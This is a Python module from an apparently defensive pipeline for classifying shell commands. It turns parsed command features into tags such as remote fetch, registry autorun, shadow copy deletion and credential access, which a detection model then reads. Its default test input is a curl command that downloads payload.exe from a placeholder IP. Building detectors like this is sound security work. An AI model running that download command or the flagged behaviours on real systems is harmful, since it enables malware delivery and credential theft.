"""
residual_text.py — Build residual / hybrid text from parser + semantic features.

Abstracts deterministic syntax into compact semantic tags, preserving only
behavior-relevant signal for the specialist model.

Input:  parsed dict   (from parser.py)
        semantic dict (from semantic_features.py)

Output: hybrid_text string — "TAG1 TAG2 TAG3 | <command_text>"

The tags replace structural detail already captured by the parser and rule
engine.  The command text uses the deobfuscated form when available, giving
the model the real payload rather than an opaque base64 blob.
"""

from typing import Dict, List, Tuple

# ─────────────────────────────────────────────────────────────────────────────
# Feature → tag mapping (checked in order; only True features emit a tag)
# ─────────────────────────────────────────────────────────────────────────────

FEATURE_TAGS: List[Tuple[str, str]] = [
    # Network / transfer
    ("downloads_remote_resource",    "REMOTE_FETCH"),
    ("transfers_file_to_remote",     "REMOTE_UPLOAD"),

    # File system
    ("writes_executable_like_file",  "WRITE_EXECUTABLE"),
    # writes_local_file is too noisy (fires on most commands); omit intentionally

    # Archive
    ("archive_create",               "ARCHIVE_CREATE"),
    ("archive_extract",              "ARCHIVE_EXTRACT"),

    # Persistence
    ("creates_scheduled_task",       "TASK_CREATE"),
    ("modifies_registry_autorun",    "REGISTRY_AUTORUN"),
    ("creates_or_modifies_service",  "SERVICE_CREATE"),

    # Execution
    ("uses_encoded_payload",         "ENCODED_PAYLOAD"),
    ("uses_obfuscation",             "OBFUSCATED"),
    ("executes_inline_code",         "INLINE_EXEC"),
    ("runs_interpreter",             "INTERPRETER"),
    ("uses_signed_proxy_binary",     "SIGNED_PROXY"),
    ("remote_execution_or_session",  "REMOTE_EXEC"),

    # Impact / credential
    ("deletes_shadow_copies",        "SHADOW_DELETE"),
    ("reads_credential_store",       "CRED_ACCESS"),

    # Discovery
    ("enumerates_identity",          "ENUM_IDENTITY"),
    ("enumerates_network_config",    "ENUM_NETWORK"),
]


def build_semantic_tags(semantic_features: dict) -> List[str]:
    """Return ordered list of uppercase semantic tag strings."""
    return [tag for feat, tag in FEATURE_TAGS if semantic_features.get(feat)]


def build_residual_text(parsed: dict, semantic_features: dict) -> str:
    """
    Build the residual text string.

    Format:  "TAG1 TAG2 | <command_text>"
    If no tags fire, returns just the command text.
    Command text = deobfuscated form when available, else raw.
    """
    tags = build_semantic_tags(semantic_features)

    # Prefer deobfuscated payload — it reveals actual behavior
    cmd = parsed.get("deobfuscated_command") or parsed.get("raw_command", "")

    if tags:
        return " ".join(tags) + " | " + cmd
    return cmd


def build_hybrid_text(parsed: dict, semantic_features: dict) -> str:
    """
    Build full hybrid input text for the specialist model.

    Alias for build_residual_text — exists so callers can import a
    clearly-named function.
    """
    return build_residual_text(parsed, semantic_features)


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import json, sys
    sys.path.insert(0, __import__("os").path.dirname(__file__))
    from parser import parse_command
    from semantic_features import build_semantic_features

    cmd = sys.argv[1] if len(sys.argv) > 1 else "curl -o payload.exe http://1.2.3.4/payload.exe"
    p = parse_command(cmd)
    s = build_semantic_features(p)
    tags = build_semantic_tags(s)
    hybrid = build_hybrid_text(p, s)
    print(json.dumps({"tags": tags, "hybrid_text": hybrid}, indent=2))
